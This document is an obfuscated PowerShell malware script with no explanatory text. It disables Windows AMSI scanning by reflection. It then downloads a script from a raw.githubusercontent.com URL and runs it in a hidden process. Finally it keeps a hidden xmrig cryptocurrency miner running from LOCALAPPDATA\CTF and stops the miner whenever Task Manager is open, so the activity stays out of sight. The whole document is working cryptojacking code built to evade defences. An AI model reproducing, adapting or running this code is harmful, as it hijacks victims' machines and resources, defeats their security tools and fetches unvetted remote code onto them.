${W} = ('System.'+'Man'+'ag'+'ement.A'+'u'+'toma'+'tion'+'.'+'A');${c} = 'si';${M} = ('U'+'tils')
${as`semB`lY} = [Ref]."a`s`seMBLY".('Ge'+'tTyp'+'e').Invoke(('{0}m{1}{2}' -f ${W},${c},${m}))
${fi`e`ld} = ${As`sE`MBlY}.('G'+'etField').Invoke(('am{0}InitFailed' -f ${C}),('Non'+'P'+'ublic'+',St'+'a'+'tic'))
${fIE`ld}.('SetVa'+'lu'+'e').Invoke(${N`UlL},${tR`Ue})

&('S'+'tar'+'t-Process') -FilePath ("po"+"wers"+"hell") -WindowStyle ('H'+'idden') -ArgumentList "Invoke-Expression (Invoke-REstMethod -Uri `'https://raw.githubusercontent.com/so251/olaquerida/main/script.txt`')"
﻿${pA`TH} = "$env:LOCALAPPDATA\CTF\xmrig.exe"
${ATIvopRo`cE`Ss} = ${f`A`LSe}
${aTi`VO`TaSK} = ${n`ULl}

while (${T`Rue}){
    &('St'+'art-Sl'+'eep') -Seconds 1
    try {
        .('Ge'+'t-P'+'roce'+'ss') ('task'+'mgr') -ErrorAction ('St'+'op')
        ${a`T`IVotask} = ${tr`Ue}
        try{&('Stop'+'-Pro'+'c'+'ess') -name ('xm'+'rig') -ErrorAction ('S'+'top')}
        catch{}
        ${A`TiVop`ROCess} = ${FA`lSe} 
    }
    catch {
       ${A`TiVoTA`Sk} = ${fa`lse} 
       try{
            .('Get-'+'Proce'+'ss') ('xm'+'rig') -ErrorAction ('S'+'top')
            ${atiVOpr`o`CESs} = ${t`RUE}
       }
       catch{
            if(${a`TIVOp`ROCesS} -eq ${f`Al`Se}){
                &('S'+'tar'+'t-Process') -FilePath ${p`AtH} -WindowStyle ('H'+'idden')
                ${a`TIV`OPROcEsS} = ${t`RuE}
            }
            else{
                ${atI`Vop`Roc`ESs} = ${f`AlSe}
                &('St'+'a'+'rt-'+'Sleep') -Seconds 3
            }
       }
    }
}

